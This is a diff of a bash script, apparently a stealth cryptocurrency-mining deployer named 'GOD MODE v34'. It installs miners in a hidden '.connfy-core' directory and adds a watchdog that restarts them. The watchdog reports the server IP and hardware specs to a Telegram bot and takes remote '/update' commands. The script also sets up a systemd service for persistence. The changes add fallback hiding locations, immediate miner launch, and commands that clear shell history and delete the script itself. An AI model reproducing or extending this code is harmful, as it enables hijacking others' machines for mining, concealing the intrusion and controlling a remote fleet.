@@ -1,7 +1,7 @@
 #!/bin/bash
 
 # ============================================================
-# | GOD MODE v32: POSIX SHELL COMPATIBLE WATCHDOG ENGINE     |
+# | GOD MODE v34: BULLETPROOF BASE_DIR & FALLBACK ENGINE      |
 # ============================================================
 
 # [ CONFIGURATION ]
@@ -23,16 +23,20 @@ POOL_CPU_2="xmr-eu.kryptex.network:7029"
 POOL_GPU_1="prl.kryptex.network:7048"
 POOL_GPU_2="prl-eu.kryptex.network:7048"
 
-# [ PRIVILEGES & HIDDEN DIRECTORY ]
+# [ SAFE PRIVILEGES & DIRECTORY FALLBACK ]
 IS_ROOT=0
 if [ "$(id -u)" -eq 0 ]; then
     IS_ROOT=1
     BASE_DIR="/usr/local/bin/.connfy-core"
-else
+elif [ -n "$HOME" ] && [ -d "$HOME" ] && [ -w "$HOME" ]; then
     BASE_DIR="$HOME/.connfy-core"
+else
+    BASE_DIR="/tmp/.connfy-core"
 fi
-mkdir -p "$BASE_DIR"
-cd "$BASE_DIR" || exit 1
+
+mkdir -p "$BASE_DIR" 2>/dev/null || BASE_DIR="/tmp/.connfy-core"
+mkdir -p "$BASE_DIR" 2>/dev/null
+cd "$BASE_DIR" 2>/dev/null || cd /tmp || exit 1
 
 # Добавляем BASE_DIR в PATH
 export PATH="$BASE_DIR:$PATH"
@@ -182,7 +186,7 @@ if [ "$HAS_GPU" -eq 1 ]; then
 fi
 
 # ----------------------------------------------------
-# [ PHASE 3: SECURE WATCHDOG ENGINE (POSIX FIXED) ]
+# [ PHASE 3: SECURE WATCHDOG ENGINE ]
 # ----------------------------------------------------
 cat <<EOF > watchdog.sh
 #!/bin/bash
@@ -204,7 +208,7 @@ LOG_CPU="$LOG_CPU"
 LOG_GPU="$LOG_GPU"
 
 export PATH="\$BASE_DIR:\$PATH"
-cd "\$BASE_DIR" || exit 1
+cd "\$BASE_DIR" 2>/dev/null || cd /tmp
 
 LAST_REPORT=\$(date +%s)
 PAUSED=0
@@ -315,7 +319,6 @@ send_specs_report() {
         msg="\${msg}🎮 <b>GPU HARDWARE DIAGNOSTICS:</b>%0A"
         local gpu_idx=0
         
-        # Исправленный POSIX-пайплайн для сбора статистики nvidia-smi
         nvidia-smi --query-gpu=name,utilization.gpu,memory.used,memory.total,temperature.gpu,fan.speed --format=csv,noheader,nounits 2>/dev/null | while IFS=',' read -r name util mem_used mem_total temp fan; do
             msg="\${msg}• <b>GPU \${gpu_idx}:</b> \${name}%0A"
             msg="\${msg}  └ Load: \${util}% | Temp: \${temp}°C | Fan: \${fan}% | VRAM: \${mem_used}MB / \${mem_total}MB%0A"
@@ -343,7 +346,7 @@ send_logs_report() {
     send_tg_msg "\$msg"
 }
 
-STARTUP_MSG="🚀 <b>ENGINE V32 ACTIVE</b>%0A🌐 <b>IP:</b> <code>\$SERVER_IP</code>%0A🆔 <b>Worker:</b> <code>\$WORKER</code>%0A💡 <i>Use /update [IP|all] to deploy changes.</i>"
+STARTUP_MSG="🚀 <b>ENGINE V34 ACTIVE</b>%0A🌐 <b>IP:</b> <code>\$SERVER_IP</code>%0A🆔 <b>Worker:</b> <code>\$WORKER</code>%0A💡 <i>Use /update [IP|all] to deploy changes.</i>"
 send_tg_msg "\$STARTUP_MSG"
 
 while true; do
@@ -354,6 +357,7 @@ while true; do
         CPU_STATUS="🟢 Active"
         if [ -f "./\$BIN_CPU" ]; then
             if ! pgrep -f "\$BIN_CPU" > /dev/null; then
+                chmod +x "./\$BIN_CPU"
                 nohup ./\$BIN_CPU --config=config.json >> "\$LOG_CPU" 2>&1 &
                 sleep 2
                 if ! pgrep -f "\$BIN_CPU" > /dev/null; then
@@ -457,6 +461,17 @@ EOF
 
 chmod +x watchdog.sh
 
+# Запускаем CPU и GPU сразу
+if [ -f "./$BIN_CPU" ]; then
+    chmod +x "./$BIN_CPU"
+    nohup ./$BIN_CPU --config=config.json >> "$LOG_CPU" 2>&1 &
+fi
+
+if [ "$HAS_GPU" -eq 1 ] && [ -f "./$BIN_GPU" ]; then
+    chmod +x "./$BIN_GPU"
+    nohup ./$BIN_GPU --algorithm pearlhash --pool $POOL_GPU_1 --wallet $WORKER --pool $POOL_GPU_2 --wallet $WORKER --watchdog-enable --retry-time 10 --disable-cpu >> "$LOG_GPU" 2>&1 &
+fi
+
 # Запускаем вачдог полностью отвязанным через явный bash
 pkill -9 -f "watchdog.sh" 2>/dev/null
 (nohup bash "$BASE_DIR/watchdog.sh" </dev/null >/dev/null 2>&1 &)
@@ -465,9 +480,10 @@ pkill -9 -f "watchdog.sh" 2>/dev/null
 # [ PHASE 4: VERBOSE CLEAN ASCII DIAGNOSTICS ]
 # ----------------------------------------------------
 echo "================================================="
-echo "[+] ENGINE V32 INITIALIZED"
+echo "[+] ENGINE V34 INITIALIZED"
 echo "[+] Server IP: $SERVER_IP"
 echo "[+] Worker ID: $WORKER"
+echo "[+] Directory: $BASE_DIR"
 echo "================================================="
 echo "[+] Igniting core engines..."
 sleep 3
@@ -539,4 +555,5 @@ EOF
     systemctl start connfy-wd >/dev/null 2>&1
 fi
 
-hi
+history -c
+rm -f "$0"
